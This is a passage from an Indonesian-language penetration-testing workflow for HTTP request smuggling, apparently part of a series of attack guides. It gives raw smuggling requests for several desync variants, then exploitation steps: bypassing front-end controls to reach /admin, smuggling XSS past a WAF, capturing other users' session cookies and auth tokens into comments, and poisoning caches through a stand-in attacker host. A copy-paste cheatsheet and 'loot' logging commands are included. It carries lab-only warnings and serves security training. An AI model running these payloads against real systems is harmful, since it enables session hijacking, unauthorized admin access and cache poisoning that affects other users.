➡️ **CONFIRMED! CL.TE desync terbukti!** Catat tipe desync:

Bash

```
echo "CL.TE CONFIRMED" >> ~/smuggling_loot/notes/findings.txt
echo "Target: $TARGET" >> ~/smuggling_loot/notes/findings.txt
echo "Endpoint: POST /" >> ~/smuggling_loot/notes/findings.txt
echo "Evidence: Follow-up request mendapat [catat response]" >> ~/smuggling_loot/notes/findings.txt
```

**OUTPUT GAGAL ❌ — Follow-up request normal:**

text

```
Tab 2 response: HTTP/1.1 200 OK (normal search response)
```

➡️ Timing mungkin tidak tepat, atau connection tidak shared. Coba:

1. Kirim Tab 1 dan Tab 2 lebih cepat (dalam 1-2 detik)
2. Coba dari connection yang sama di Burp (pastikan "Connection: keep-alive")
3. Lanjut ke Fase 3 (TE.CL) juga

---

## ═══════════════════════════════════════

## FASE 3: TE.CL DETECTION

## ═══════════════════════════════════════

> **Skenario:** FE menggunakan `Transfer-Encoding`, BE menggunakan `Content-Length`

### Langkah 3.1 — TE.CL Timing Probe

**Di Burp Repeater (HTTP/1, Update Content-Length: UNCHECK):**

http

```
POST / HTTP/1.1
Host: lab.target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
Connection: keep-alive

0

X
```

> **Cara baca:**
> 
> - FE baca TE → melihat `0\r\n\r\n` = chunked body selesai → forward
> - BE baca CL: 6 → membaca 6 byte pertama = `0\r\n\r\n` (end chunk) + `X`
> - BE mencoba parse request kedua dari `X` → **HANG menunggu lebih banyak data**

**Byte count untuk CL: 6:**

text

```
0     = 1 byte
\r\n  = 2 byte
\r\n  = 2 byte
(space/empty) = 0
X     = 1 byte
= 6 total? 
```

> ⚠️ **Praktisnya gunakan Burp untuk calculate**, lalu tweak angka CL untuk efek yang diinginkan.

**OUTPUT BERHASIL ✅ — DELAY SIGNIFIKAN (TE.CL vulnerable!):**

text

```
Response time: ~10 seconds
HTTP/1.1 408 Request Timeout
```

➡️ **TE.CL confirmed!** Ulangi 3x untuk konsistensi. Lanjut ke **Langkah 3.2**.

**OUTPUT GAGAL ❌ — Tidak ada delay:**

text

```
Response time: 0.119s
HTTP/1.1 200 OK
```

➡️ TE.CL tidak vulnerable di endpoint ini. Lanjut ke **Fase 4 (TE.TE)**.

**OUTPUT GAGAL ❌ — 400 Bad Request immediate:**

text

```
HTTP/1.1 400 Bad Request
Invalid chunk size
```

➡️ Server menolak malformed chunk. Coba variasi chunk format di Langkah 3.2.

---

### Langkah 3.2 — TE.CL Differential Confirmation

**Poison Request (Tab 1):**

http

```
POST / HTTP/1.1
Host: lab.target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Connection: keep-alive

5e
POST /404_should_not_exist HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

> 📌 `5e` = hexadecimal untuk jumlah byte dari `POST /404...` sampai `x=1\r\n`. Hitung dengan cermat atau gunakan Burp extension untuk auto-calculate.

**Follow-up Normal Request (Tab 2, kirim cepat setelah Tab 1):**

http

```
POST / HTTP/1.1
Host: lab.target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Connection: keep-alive

search=test
```

**OUTPUT BERHASIL ✅:**

text

```
Tab 2 response:
HTTP/1.1 404 Not Found
(response untuk /404_should_not_exist, bukan untuk POST /)
```

➡️ **TE.CL CONFIRMED!**

---

## ═══════════════════════════════════════

## FASE 4: TE.TE OBFUSCATION DETECTION

## ═══════════════════════════════════════

> **Skenario:** Kedua sisi mendukung TE, tapi salah satu mengabaikan variant tertentu → salah satu fallback ke CL.

### Langkah 4.1 — Systematic TE Variant Testing

**Test setiap variant ini di Burp Repeater secara berurutan. Catat hasil ke tabel:**

Bash

```
# Tracking table (isi manual dari Burp results)
cat > ~/smuggling_loot/notes/te_variants.md << 'EOF'
| Variant | Response Time | Status Code | Notes |
|---------|--------------|-------------|-------|
| Transfer-Encoding: chunked | baseline | 200 | normal |
| Transfer-Encoding: xchunked | ? | ? | |
| Transfer-Encoding: chunked, chunked | ? | ? | |
| Transfer-Encoding: X | ? | ? | |
| Transfer-Encoding: chunked ; | ? | ? | |
| Transfer-Encoding: chunked, identity | ? | ? | |
| Transfer-Encoding: identity, chunked | ? | ? | |
| Transfer-Encoding: "chunked" | ? | ? | |
|  Transfer-Encoding: chunked (leading space) | ? | ? | |
| Transfer-Encoding: chunked\t (tab) | ? | ? | |
EOF
```

**Template request untuk setiap variant (ubah header TE-nya):**

http

```
POST / HTTP/1.1
Host: lab.target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: [VARIANT_DISINI]
Connection: keep-alive

0
```

**Variant yang perlu ditest satu per satu di Burp:**

text

```
Variant 1: Transfer-Encoding: xchunked
Variant 2: Transfer-Encoding: chunked, chunked  
Variant 3: Transfer-Encoding: X
Variant 4: Transfer-Encoding: chunked ;
Variant 5: Transfer-Encoding: chunked, identity
Variant 6: Transfer-Encoding: identity, chunked
Variant 7: Transfer-Encoding: "chunked"
Variant 8:  Transfer-Encoding: chunked  (leading space sebelum header name)
```

**OUTPUT BERHASIL ✅ — Satu variant menyebabkan delay:**

text

```
Normal chunked: 0.115s
xchunked: 9.98s  ← DELAY!
```

➡️ **TE.TE dengan `xchunked` variant!**

Ini berarti:

- FE mengenali `xchunked` → pakai TE → forward
- BE tidak mengenali `xchunked` → fallback ke CL → boundary mismatch → desync!

Bash

```
echo "TE.TE VARIANT FOUND: [catat variant yang delay]" >> ~/smuggling_loot/notes/findings.txt
```

**OUTPUT GAGAL ❌ — Semua variant sama seperti baseline:**

text

```
Semua request: ~0.115s, HTTP 200
```

➡️ TE.TE tidak applicable di target ini. Lanjut ke **Fase 5 (HTTP/2 Smuggling)** jika target support H2, atau ke **Fase 7 (Exploitation dari hasil Fase 2/3)**.

---

## ═══════════════════════════════════════

## FASE 5: HTTP/2 SMUGGLING DETECTION

## ═══════════════════════════════════════

> **Prasyarat:** Target support HTTP/2 (dari Langkah 0.1)

### Langkah 5.1 — Verifikasi H2 dan Downgrade

Bash

```
# Command 1: Konfirmasi H2 support
curl -sI --http2 $TARGET 2>&1 | grep "HTTP/2"

# Command 2: Cek apakah ada downgrade indicator
# (Response header yang menunjukkan H1 di backend)
curl -sI --http2 $TARGET 2>&1 | grep -iE "(via|upgrade|x-forwarded-proto)"

# Command 3: Cek protocol negotiation
openssl s_client -connect $TARGET_HOST:443 -alpn h2 2>/dev/null | grep "ALPN"
```

**OUTPUT BERHASIL ✅ — H2 confirmed dengan downgrade:**

text

```
HTTP/2 200
via: 1.1 backend-server  ← menunjukkan H1 di backend setelah downgrade
```

➡️ **H2 → H1 downgrade chain exists!** Test H2.CL dan H2.TE via Burp.

**OUTPUT GAGAL ❌ — H2 tidak supported:**

text

```
HTTP/1.1 200 OK
(tidak ada HTTP/2 di response)
```

➡️ Skip Fase 5. Kembali ke hasil Fase 2/3/4.

---

### Langkah 5.2 — H2.CL Testing (via Burp Repeater)

**Di Burp Repeater → Ubah protocol ke HTTP/2 (toggle di pojok kanan bawah):**

text

```
Di Burp Repeater:
1. Klik dropdown protocol (biasanya "HTTP/1" di pojok kanan bawah)
2. Pilih "HTTP/2"
3. Pastikan "Update Content-Length" dimatikan
```

**H2.CL probe request:**

http

```
POST / HTTP/2
Host: lab.target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


GET /hopefully404 HTTP/1.1
Host: lab.target.com
Content-Length: 5

x=1
```

> **Cara kerja H2.CL:**
> 
> - Client → H2 request dengan body yang berisi "smuggled H1 request"
> - FE (H2) → membaca H2 framing → forward ke BE
> - BE (H1) → membaca Content-Length → hanya baca sebagian → sisa jadi "request baru"

**OUTPUT BERHASIL ✅ — Differential response:**

text

```
Next follow-up request mendapat:
HTTP/1.1 404 Not Found (/hopefully404 seharusnya 404)
atau behavior unexpected lainnya
```

➡️ **H2.CL CONFIRMED!**

**OUTPUT GAGAL ❌ — Normal response:**

text

```
Normal 200 OK untuk semua requests
```

➡️ H2.CL tidak vulnerable. Test H2.TE di Langkah 5.3.

---

### Langkah 5.3 — H2.TE Testing

**Di Burp Repeater (HTTP/2 mode):**

http

```
POST / HTTP/2
Host: lab.target.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked


0

GET /hopefully404 HTTP/1.1
Host: lab.target.com
```

> **H2.TE context:** HTTP/2 spec melarang penggunaan Transfer-Encoding. Jika server meneruskannya ke H1 backend secara tidak aman → desync.

**OUTPUT BERHASIL ✅:**

text

```
Follow-up request mendapat response untuk /hopefully404
```

➡️ **H2.TE CONFIRMED!**

**Google jika buntu dengan H2:**

text

```
search: "H2.CL smuggling portswigger"
search: "HTTP/2 request smuggling [target server] bypass"
search: "h2 desync attack site:portswigger.net/research"
```

---

## ═══════════════════════════════════════

## FASE 6: AUTOMATED SCANNING (Burp Extension)

## ═══════════════════════════════════════

### Langkah 6.1 — Jalankan HTTP Request Smuggler Extension

**Di Burp:**

text

```
1. Pergi ke HTTP history
2. Klik kanan pada request target (POST /)
3. Pilih "Extensions" → "HTTP Request Smuggler" → "Launch"
4. Pilih semua teknik: CL.TE, TE.CL, TE.TE, H2.CL, H2.TE
5. Klik "OK" → tunggu hasil
```

**OUTPUT BERHASIL ✅ — Extension menemukan sesuatu:**

text

```
[+] Possible CL.TE issue detected
Timing: 10.021s (baseline: 0.112s)
Confidence: High
```

**PENTING: Treat ini sebagai POTENTIAL, bukan CONFIRMED:**

Bash

```
echo "Extension result: POTENTIAL CL.TE" >> ~/smuggling_loot/notes/findings.txt
echo "Action needed: Manual confirmation via Repeater" >> ~/smuggling_loot/notes/findings.txt
```

➡️ Kembali ke Fase 2/3 untuk **manual confirmation** dari temuan extension.

**OUTPUT BERHASIL ✅ — Extension tidak menemukan apa-apa:**

text

```
[*] No smuggling detected
```

➡️ Bukan berarti tidak vulnerable. Coba manual testing tetap. Extension bisa miss beberapa kasus.

---

## ═══════════════════════════════════════

## FASE 7: EXPLOITATION — BYPASS SECURITY CONTROLS

## ═══════════════════════════════════════

> **Prasyarat:** Sudah CONFIRMED salah satu dari CL.TE, TE.CL, TE.TE, H2.CL, atau H2.TE

### Langkah 7.1 — Identifikasi Security Controls di FE

Bash

```
# Command 1: Cek endpoint yang diblok oleh FE
for path in "/admin" "/internal" "/debug" "/.env" "/api/admin" "/config" "/status"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET$path")
  echo "$path → $CODE"
done

# Command 2: Cek method restriction di FE
for method in "GET" "POST" "PUT" "DELETE" "PATCH" "TRACE"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" -X $method "$TARGET/api/test")
  echo "$method → $CODE"
done

# Command 3: Cek IP restriction (apakah ada X-Forwarded-For bypass)
curl -sk $TARGET/admin \
  -H "X-Forwarded-For: 127.0.0.1" \
  -o /dev/null -w "%{http_code}\n"
```

**OUTPUT BERHASIL ✅ — Endpoint diblok oleh FE:**

text

```
/admin → 403
/internal → 403
/debug → 403
/ → 200  (normal endpoint)
```

➡️ FE blok `/admin` tapi mungkin BE tidak! Ini target untuk smuggling bypass.

---

### Langkah 7.2 — Admin Access Bypass via CL.TE Smuggling

**Di Burp Repeater (HTTP/1, Update-CL OFF):**

**Poison Request (smuggle GET /admin):**

http

```
POST / HTTP/1.1
Host: lab.target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /admin HTTP/1.1
X-Ignore: X
```

**Langsung setelah itu, kirim Follow-up Request:**

http

```
GET / HTTP/1.1
Host: lab.target.com
Connection: keep-alive
```

**OUTPUT BERHASIL ✅ — /admin accessible via smuggling:**

text

```
HTTP/1.1 200 OK
<html>Admin Panel</html>
atau
HTTP/1.1 302 Found
Location: /admin/dashboard
```

➡️ **BYPASS BERHASIL!** FE tidak melihat `/admin` request tapi BE memprosesnya.

**Simpan bukti:**

Bash

```
# Simpan request dan response di Burp → klik kanan → Save item
echo "Admin bypass CONFIRMED via CL.TE smuggling" >> ~/smuggling_loot/notes/findings.txt
```

**OUTPUT GAGAL ❌ — Masih 403:**

text

```
HTTP/1.1 403 Forbidden
```

➡️ Mungkin:

1. BE juga melakukan access control check → smuggling bypass tidak cukup
2. Perlu tambahkan header internal untuk bypass: coba tambah `X-Forwarded-For: 127.0.0.1` atau `X-Internal: true` di smuggled request
3. Perlu creds → lanjut ke Langkah 7.3

---

### Langkah 7.3 — Reveal FE Request Rewriting

> Berguna untuk menemukan header internal yang bisa digunakan untuk bypass auth

**Di Burp Repeater, smuggle ke endpoint yang echo request:**

**Poison Request (smuggle ke capture endpoint):**

http

```
POST / HTTP/1.1
Host: lab.target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked
Connection: keep-alive

0

POST /post/comment HTTP/1.1
Host: lab.target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

comment=
```

> **Ide:** `/post/comment` adalah endpoint yang menyimpan/echo input. Kita smuggle request yang bodynya dimulai dengan `comment=`. Request berikutnya dari user (atau kita sendiri) akan di-append ke `comment=` field → kita bisa "capture" header mereka.

**Follow-up request (untuk append ke smuggled body):**

http

```
POST /post/comment HTTP/1.1
Host: lab.target.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=your_session_here
Content-Length: 15

comment=captured
```

**OUTPUT BERHASIL ✅ — Captured headers muncul di comment:**

text

```
Comment: POST /post/comment HTTP/1.1
Host: lab.target.com
X-Forwarded-For: 192.168.1.100
X-Internal-Token: secret123
Authorization: Bearer eyJ...
Cookie: session=victim_session
```

➡️ **JACKPOT!** FE meng-inject headers yang tidak visible dari luar. Kita bisa lihat:

- Internal routing headers
- Real client IP
- Internal auth tokens
- Bahkan session cookies dari user lain!

Bash

```
# Catat header internal yang ditemukan
cat >> ~/smuggling_loot/notes/findings.txt << 'EOF'
FE Request Rewriting Headers Found:
- X-Forwarded-For: [value]
- X-Internal-Token: [value] ← potential auth bypass!
- Authorization: [value]
EOF
```

---

### Langkah 7.4 — XSS via HTTP Smuggling

**Kondisi:** Target punya reflected XSS yang diblok oleh FE WAF

Bash

```
# Verifikasi XSS diblok di level FE
curl -sk "$TARGET/search?q=<script>alert(1)</script>" -o /dev/null -w "%{http_code}\n"
# Expected: 403 (WAF blocks XSS)
```

**OUTPUT: 403** → FE WAF blok XSS. Test bypass via smuggling:

**Di Burp Repeater, smuggle XSS request:**

http

```
POST / HTTP/1.1
Host: lab.target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /search?q=<script>alert(document.domain)</script> HTTP/1.1
Host: lab.target.com
X-Ignore: X
```

**Follow-up:**

http

```
GET / HTTP/1.1
Host: lab.target.com
Connection: keep-alive
```

**OUTPUT BERHASIL ✅ — XSS executed:**

text

```
HTTP/1.1 200 OK
<html>
...Results for: <script>alert(document.domain)</script>...
```

➡️ **WAF bypassed via smuggling!** XSS berjalan karena request XSS masuk langsung ke BE tanpa melewati WAF FE.

**OUTPUT GAGAL ❌ — Masih terblok:**

text

```
HTTP/1.1 403 Forbidden
```

➡️ BE juga punya WAF/filtering. Atau timing request tidak tepat. Coba variasi timing.

---

## ═══════════════════════════════════════

## FASE 8: CAPTURE OTHER USERS' REQUESTS

## ═══════════════════════════════════════

> ⚠️ **HANYA di lab environment (PortSwigger, HTB, THM) yang secara eksplisit punya "victim" simulator. JANGAN di production.**

### Langkah 8.1 — Setup Request Capture

**Asumsi:** Target punya endpoint yang menyimpan user input (comment, post, dll.)

**Di Burp Repeater, kirim poison request berulang kali:**

http

```
POST / HTTP/1.1
Host: lab.target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked
Connection: keep-alive

0

POST /post/comment HTTP/1.1
Host: lab.target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 700

csrf=validcsrftoken&postId=5&name=hacker&email=hacker@test.com&website=&comment=
```

> **Cara kerja:**
> 
> - Content-Length: 700 di smuggled request → BE akan menunggu 700 byte untuk body
> - Request dari victim berikutnya akan di-append ke `comment=` field
> - Jika victim request berisi Cookie/Auth header → akan tersimpan di comment!

**Kirim request ini berulang kali (10-20x), lalu cek comment yang tersimpan.**

**OUTPUT BERHASIL ✅ — Victim request ter-capture:**

text

```
Comment tersimpan:
"GET /private HTTP/1.1
Host: lab.target.com
Cookie: session=VICTIM_SESSION_TOKEN_HERE
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

➡️ **Session hijacking potential!** Di lab context, gunakan token ini untuk akses sebagai victim.

Bash

```
# Simpan captured token
VICTIM_SESSION="[extracted session token]"
echo "Captured victim session: $VICTIM_SESSION" >> ~/smuggling_loot/notes/findings.txt

# Test apakah token valid
curl -sk $TARGET/my-account \
  -H "Cookie: session=$VICTIM_SESSION" \
  -o /tmp/victim_account.html
grep -i "email\|username\|account" /tmp/victim_account.html | head -5
```

**OUTPUT GAGAL ❌ — Comment tidak mengandung victim data:**

text

```
Comment: (kosong atau hanya kita sendiri)
```

➡️ Beberapa kemungkinan:

1. Content-Length di smuggled request terlalu kecil → victim request tidak cukup ter-capture
2. Timing tidak tepat → victim simulator belum kirim request saat poison aktif
3. Coba naikkan Content-Length: 700 → 1000 dan ulangi

---

## ═══════════════════════════════════════

## FASE 9: WEB CACHE POISONING VIA SMUGGLING

## ═══════════════════════════════════════

### Langkah 9.1 — Identifikasi Cache Behavior

Bash

```
# Command 1: Cek apakah response di-cache
curl -sk $TARGET -I | grep -iE "(cache|age|x-cache|etag|expires)"

# Command 2: Kirim 2 request identik, bandingkan Age header
curl -sk $TARGET -I | grep "Age:"
sleep 2
curl -sk $TARGET -I | grep "Age:"
# Jika Age bertambah → caching aktif

# Command 3: Identifikasi cache key (headers yang mempengaruhi cache)
curl -sk $TARGET -H "X-Cache-Test: value1" -I | grep -iE "(x-cache|hit|miss)"
curl -sk $TARGET -H "X-Cache-Test: value2" -I | grep -iE "(x-cache|hit|miss)"
```

**OUTPUT BERHASIL ✅ — Caching aktif:**

text

```
Request 1: Age: 0, X-Cache: MISS
Request 2 (2 detik kemudian): Age: 2, X-Cache: HIT
```

➡️ Cache aktif! Potential cache poisoning. Lanjut ke Langkah 9.2.

**OUTPUT GAGAL ❌ — Tidak ada caching:**

text

```
Cache-Control: no-store, no-cache
```

➡️ Caching dinonaktifkan. Skip Fase 9.

---

### Langkah 9.2 — Cache Poisoning via Smuggling

**Di Burp Repeater:**

**Poison + Cache Poisoning Request:**

http

```
POST / HTTP/1.1
Host: lab.target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /static/js/main.js HTTP/1.1
Host: lab.target.com
X-Forwarded-Host: evil.attacker.com
```

**Langsung follow dengan:**

http

```
GET /static/js/main.js HTTP/1.1
Host: lab.target.com
```

**OUTPUT BERHASIL ✅ — Poisoned response di-cache:**

text

```
HTTP/1.1 200 OK
X-Cache: HIT
Content: (response untuk evil.attacker.com, bukan lab.target.com)
atau
Location: https://evil.attacker.com/malicious.js
```

➡️ **Cache poisoned!** Request berikutnya dari user lain untuk `/static/js/main.js` akan mendapat response yang sudah di-poison.

---

## ═══════════════════════════════════════

## FASE 10: CROSS-SERVICE CONNECTION

## ═══════════════════════════════════════

### Setelah HTTP Smuggling Confirmed — Pivot ke Vulnerability Lain

text

```
HTTP Smuggling Finding
    │
    ├──→ Admin panel accessible → Cek credentials, RCE
    │       → ke <a href="/docs/idor-access-control" class="text-[#00b4d8] hover:underline font-mono font-semibold">27_idor_access_control_workflow.md</a>
    │
    ├──→ Internal headers revealed → Authentication bypass
    │       → ke <a href="/docs/authentication-bypass" class="text-[#00b4d8] hover:underline font-mono font-semibold">18_authentication_bypass_workflow.md</a>
    │
    ├──→ XSS endpoint reachable → Cookie theft, CSRF
    │       → ke <a href="/docs/xss" class="text-[#00b4d8] hover:underline font-mono font-semibold">20_xss_workflow.md</a>
    │
    ├──→ Cache poisoning → Mass exploitation
    │       → Dokumentasikan untuk report
    │
    ├──→ Victim session captured → Account takeover
    │       → Test akses ke <a href="/docs/idor-access-control" class="text-[#00b4d8] hover:underline font-mono font-semibold">27_idor_access_control_workflow.md</a>
    │
    └──→ SSRF via smuggled request → Internal service access
            → ke <a href="/docs/ssrf" class="text-[#00b4d8] hover:underline font-mono font-semibold">22_ssrf_workflow.md</a>
```

**Simpan semua credentials/tokens yang ditemukan:**

Bash

```
# Central loot storage
cat > ~/smuggling_loot/notes/loot_summary.txt << 'EOF'
=== HTTP SMUGGLING LOOT ===
Target: [TARGET]
Date: $(date)

Vulnerability Type: [CL.TE / TE.CL / TE.TE / H2.CL / H2.TE]
Endpoint: [endpoint]
Confirmed: YES

Captured Data:
- Admin panel: [YES/NO]
- Internal headers: [list]
- Session tokens: [list]
- Other: [notes]

Next Steps:
- [action items]
EOF
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error / Situasi|Penyebab|Solusi|
|---|---|---|
|Delay inconsistent|Network noise / single server|Ulangi 5x, jika masih inconsistent → false positive|
|`400 Bad Request` immediate|Malformed chunk/CL|Hitung byte ulang, periksa CRLF|
|`408 Request Timeout` normal|Server timeout standar|Bandingkan dengan baseline yang sudah ada|
|`502 Bad Gateway`|BE tidak bisa proses|Menarik, bisa jadi signal. Coba differential|
|Extension tidak detect|Request salah / target tidak vulnerable|Coba manual di Repeater|
|Differential tidak muncul|Timing terlalu lambat|Kirim follow-up lebih cepat (< 2 detik)|
|H2 test tidak bisa|Burp versi lama|Update Burp atau toggle manual protocol|
|`421 Misdirected Request`|Host mismatch|Gunakan exact Host header yang sesuai target|
|Payload ke /admin masih 403|BE juga ada access control|Tambah internal headers di smuggled request|
|Chunked body rejected|Parser ketat|Coba TE.TE variant, atau H2 approach|
|curl hasil beda dengan Burp|curl normalize framing|Gunakan Burp untuk semua smuggling test|
|Connection tidak shared|Load balancer sticky session|Tidak bisa berbuat banyak, try different endpoint|
|Capture endpoint kosong|Poison timing salah|Kirim poison lebih sering, check CL di smuggled req|
|Cache tidak poisoned|Cache key includes host|Analisis cache key lebih dalam|
|Tidak ada FE+BE stack|Single server setup|Smuggling tidak applicable, skip ke vuln lain|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Ada web application
│
├─ FASE 0: Stack Identification
│   ├─ Single server? → Smuggling unlikely, skip
│   └─ FE + BE chain? → LANJUT
│
├─ FASE 1: Baseline
│   └─ Catat response time ~X ms
│
├─ FASE 2: CL.TE Test
│   ├─ Delay ~10s? → CL.TE CONFIRMED → FASE 7
│   └─ Tidak ada delay? → FASE 3
│
├─ FASE 3: TE.CL Test
│   ├─ Delay ~10s? → TE.CL CONFIRMED → FASE 7
│   └─ Tidak ada delay? → FASE 4
│
├─ FASE 4: TE.TE Variants
│   ├─ Variant menyebabkan delay? → TE.TE CONFIRMED → FASE 7
│   └─ Semua normal? → FASE 5 (jika H2)
│
├─ FASE 5: H2 Smuggling (jika target support H2)
│   ├─ H2.CL atau H2.TE differential? → CONFIRMED → FASE 7
│   └─ Tidak ada? → Smuggling tidak ditemukan
│
├─ FASE 6: Automated Scan (paralel, konfirmasi manual)
│
└─ FASE 7-10: Exploitation
    ├─ FE security bypass → Admin access
    ├─ Request rewriting reveal → Internal headers
    ├─ XSS chain → Cookie theft
    ├─ User request capture → Session hijack
    └─ Cache poisoning → Mass impact
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="https://lab.target.com"
export TARGET_HOST="lab.target.com"
mkdir -p ~/smuggling_loot/{requests,responses,notes}

# === RECON ===
curl -sI --http2 $TARGET 2>&1 | head -10
curl -sI $TARGET | grep -iE "(server|via|x-cache|cf-ray|age)"

# === BASELINE ===
for i in {1..5}; do
  curl -sk -o /dev/null -w "time=%{time_total} code=%{http_code}\n" \
  --http1.1 -X POST $TARGET \
  -H "Content-Length: 5" --data "hello"
done

# === ENDPOINT CHECK ===
for path in "/" "/login" "/search" "/api/" "/admin"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" --http1.1 -X POST \
    -H "Content-Length: 5" --data "test=" "$TARGET$path")
  echo "$path → $CODE"
done

# === ADMIN BYPASS CHECK ===
for path in "/admin" "/internal" "/debug" "/.env"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET$path")
  echo "$path → $CODE"
done

# === H2 CHECK ===
curl -sI --http2 $TARGET 2>&1 | grep "HTTP/2"
openssl s_client -connect $TARGET_HOST:443 -alpn h2 2>/dev/null | grep "ALPN"

# === LOOT SAVE ===
echo "[+] Vuln Type: [CL.TE/TE.CL/TE.TE/H2.CL/H2.TE]" >> ~/smuggling_loot/notes/findings.txt
echo "[+] Admin bypass: [YES/NO]" >> ~/smuggling_loot/notes/findings.txt
echo "[+] Captured tokens: [tokens]" >> ~/smuggling_loot/notes/findings.txt

# === ALL TESTING via Burp Repeater ===
# - HTTP/1 mode
# - Update Content-Length: OFF
# - Kirim probe, ukur response time
# - Konfirmasi dengan differential response
# - Chain ke XSS/Admin bypass/Cache poisoning
```

---

> **⚠️ GOLDEN RULES yang TIDAK BOLEH DILANGGAR:**
> 
> 1. **Selalu baseline dulu** sebelum probe
> 2. **Ulang minimal 3x** sebelum klaim true positive
> 3. **Gunakan Burp Repeater** (bukan curl) untuk precise testing
> 4. **Reset connection** setelah setiap probe berbahaya
> 5. **Jangan test production** tanpa izin eksplisit tertulis
> 6. **Verify manual** setelah automated tool detect sesuatu

---

> **➡️ NEXT:** Setelah HTTP Smuggling selesai, lanjut ke **`[32 — Deserialization Workflow 🔐](/docs/deserialization)`** untuk exploit Java/PHP/Python deserialization yang sering muncul di service yang sama dengan target web ini.